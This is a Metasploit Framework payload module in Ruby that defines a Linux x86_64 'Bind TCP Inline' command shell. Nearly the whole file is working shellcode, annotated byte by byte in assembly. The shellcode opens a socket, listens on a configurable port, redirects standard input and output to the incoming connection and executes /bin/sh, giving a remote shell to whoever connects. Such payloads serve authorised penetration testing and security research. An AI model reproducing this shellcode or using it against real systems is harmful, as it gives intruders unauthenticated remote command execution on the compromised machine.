##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
	include Msf::Payload::Single
	include Msf::Payload::Linux
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Bind TCP Inline',
			'Description'   => 'Listen for a connection and spawn a command shell',
			'Author'        => 'ricky',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86_64,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShellUnix,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT' => [ 20, 'n' ],
						},
					'Payload' =>
						"\x6a\x29"                     + # pushq  $0x29
						"\x58"                         + # pop    %rax
						"\x99"                         + # cltd
						"\x6a\x02"                     + # pushq  $0x2
						"\x5f"                         + # pop    %rdi
						"\x6a\x01"                     + # pushq  $0x1
						"\x5e"                         + # pop    %rsi
						"\x0f\x05"                     + # syscall
						"\x48\x97"                     + # xchg   %rax,%rdi
						"\x52"                         + # push   %rdx
						"\xc7\x04\x24\x02\x00"         + # movl   $0xb3150002,(%rsp)
						"\x15\xb3"                     + #
						"\x48\x89\xe6"                 + # mov    %rsp,%rsi
						"\x6a\x10"                     + # pushq  $0x10
						"\x5a"                         + # pop    %rdx
						"\x6a\x31"                     + # pushq  $0x31
						"\x58"                         + # pop    %rax
						"\x0f\x05"                     + # syscall
						"\x6a\x32"                     + # pushq  $0x32
						"\x58"                         + # pop    %rax
						"\x0f\x05"                     + # syscall
						"\x48\x31\xf6"                 + # xor    %rsi,%rsi
						"\x6a\x2b"                     + # pushq  $0x2b
						"\x58"                         + # pop    %rax
						"\x0f\x05"                     + # syscall
						"\x48\x97"                     + # xchg   %rax,%rdi
						"\x6a\x03"                     + # pushq  $0x3
						"\x5e"                         + # pop    %rsi
						"\x48\xff\xce"                 + # dec    %rsi
						"\x6a\x21"                     + # pushq  $0x21
						"\x58"                         + # pop    %rax
						"\x0f\x05"                     + # syscall
						"\x75\xf6"                     + # jne    33 <dup2_loop>
						"\x6a\x3b"                     + # pushq  $0x3b
						"\x58"                         + # pop    %rax
						"\x99"                         + # cltd
						"\x48\xbb\x2f\x62\x69\x6e\x2f" + # movabs $0x68732f6e69622f,%rbx
						"\x73\x68\x00"                 + #
						"\x53"                         + # push   %rbx
						"\x48\x89\xe7"                 + # mov    %rsp,%rdi
						"\x52"                         + # push   %rdx
						"\x57"                         + # push   %rdi
						"\x48\x89\xe6"                 + # mov    %rsp,%rsi
						"\x0f\x05"                       # syscall
				}
			))
	end

end
